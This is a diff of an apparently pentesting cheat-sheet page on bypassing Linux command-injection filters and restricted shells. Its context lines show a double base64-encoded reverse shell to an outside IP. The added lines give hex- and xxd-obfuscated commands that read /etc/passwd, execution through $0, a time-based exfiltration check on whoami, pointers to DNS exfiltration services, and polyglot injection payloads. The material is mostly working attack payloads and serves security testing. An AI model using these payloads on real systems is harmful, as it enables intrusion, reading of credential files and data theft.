@@ -18,7 +18,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 exec >&0
 ```
 
-## Bypass Paths and forbidden commands
+## Bypass Paths and forbidden words
 
 ```bash
 # Question mark binary substitution
@@ -42,6 +42,10 @@ ls *
 ech''o test # echo test
 ech""o test # echo test
 bas''e64 # base64
+/\b\i\n/////s\h
+
+# Execution thriugh $0
+echo whoami|$0
 
 # Uninitialized variables: A uninitialized variable equals to null (nothing)
 cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
@@ -90,11 +94,47 @@ $u $u # This will be saved in the history and can be used as a space, please not
 uname!-1\-a # This equals to uname -a
 ```
 
+## Bypass backslash and slash
+
+```bash
+cat ${HOME:0:1}etc${HOME:0:1}passwd
+cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+```
+
+## Bypass with hex encoding
+
+```bash
+echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
+cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
+abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
+`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
+cat `xxd -r -p <<< 2f6574632f706173737764`
+xxd -r -ps <(echo 2f6574632f706173737764)
+cat `xxd -r -ps <(echo 2f6574632f706173737764)`
+```
+
 ## Bypass IPs
 
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
+```
+
+## Time based data exfiltration
+
+```bash
+time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
+```
+
+## DNS data exfiltration
+
+You could use **burpcollab** or [**pingb**](http://pingb.in/) ****for example.
+
+## Polyglot command injection
+
+```bash
+1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
 
 ## References & More
